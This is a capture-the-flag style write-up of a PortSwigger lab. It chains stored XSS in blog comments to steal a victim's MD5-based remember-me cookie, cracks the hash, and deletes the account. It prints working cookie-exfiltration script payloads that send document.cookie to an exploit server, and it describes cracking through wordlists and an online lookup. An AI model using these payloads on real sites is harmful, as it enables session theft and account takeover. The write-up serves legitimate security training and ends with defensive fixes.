# Offline password cracking

**Category:** Authentication
**Difficulty:** PRACTITIONER
**Lab:** https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking

The previous lab brute-forced a predictable cookie against our own candidate wordlist. This one starts from a harder position: the target's actual cookie isn't something we can just compute — we have to steal it first, through an unrelated stored XSS bug, before the same MD5-cracking problem even becomes relevant. And once cracked, the goal isn't just reading the account; it's deleting it.

## The Target

The same `stay-logged-in` cookie construction as the previous lab — base64 of `username:md5(password)` — but this time attached to a specific victim, `carlos`, whose password isn't in our standard candidate list. The site's blog comment functionality is vulnerable to stored XSS, which is the actual way in.

## The Investigation

We logged in as `wiener` first to establish a working session and located the exploit server URL referenced on the site. From there, the script found a blog post to comment on and posted a stored XSS payload targeting that exploit server:

```
<script>document.location="{exploit_server}/exploit?cookie="+document.cookie</script>
```

That's a redirect-based cookie exfiltration payload rather than a direct fetch — the victim's browser, on loading the poisoned comment, navigates itself to our exploit server with `document.cookie` appended as a query parameter, landing the victim's session cookies straight into the exploit server's own access log.

After posting the comment, the script polled the exploit server's `/log` endpoint (with a short wait, then a longer retry if nothing showed up yet) for a `stay-logged-in=` value in the log text. Once captured, decoding the base64 cookie split cleanly into `username:md5hash` — confirming the same predictable cookie structure from the previous lab, just now populated with the real victim's data instead of something we constructed ourselves.

## The Exploit

With the victim's actual MD5 hash in hand, the cracking step ran through several fallback layers, exactly as encoded in `lab_10_offline_cracking`:

1. **Local wordlist first.** Hash every password in the standard 100-entry candidate list and compare against the stolen hash. Per our notes, the real password here isn't guaranteed to be in that list.
2. **Online MD5 lookup.** If the local list came up empty, the script queried `md5decrypt.net`'s API directly with the stolen hash.
3. **Extended fallback list.** As a last resort, a small hardcoded list of common passwords outside the standard candidates — including `onceuponatime`, `trustno1`, `iloveyou1`, and several others — was checked against the hash locally.

Once the password was recovered, the script logged in as the victim with the cracked credentials, loaded `/my-account`, and submitted `POST /my-account/delete` with the CSRF token and password to delete the account — the lab's actual solve condition, not merely logging in.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's solution follows the identical chain: observe that the `stay-logged-in` cookie is `username:md5(password)`, notice the comment field is vulnerable to XSS, post `<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>` on a blog post, check the exploit server's access log for the victim's `GET` request carrying the cookie, decode it in Burp Decoder to get the hash, and — notably — crack it by pasting the hash directly into a search engine rather than a wordlist, which reveals the password as `onceuponatime`.

That published answer lines up directly with our own script: `onceuponatime` sits in our hardcoded extended fallback list precisely because it's known not to appear in the standard 100-word candidate list, which is exactly the scenario our notes anticipated ("password may NOT be in standard candidate list"). PortSwigger's manual "paste into a search engine" step and our automated `md5decrypt.net` API call are doing the same job — an online rainbow-table-style lookup — and our hardcoded fallback would have caught the same value even if the API call failed. The XSS payload itself matches PortSwigger's almost exactly, differing only in how the exploit server URL is substituted into the string.

## What This Teaches Us

This lab chains two separate weaknesses into one working attack: a stored XSS in an unrelated feature (blog comments) becomes the delivery mechanism for stealing a session artifact, and that artifact is only worth stealing because it's built from a fast, unsalted hash function. MD5 was never designed for password storage — it's fast specifically so it can be brute-forced or rainbow-tabled quickly, which is the opposite of what a credential-derived cookie needs. Fixing this requires both halves: sanitize user-controlled input rendered into pages (closing the XSS), and never derive a persistent authentication token from a fast hash of the account's actual password in the first place.
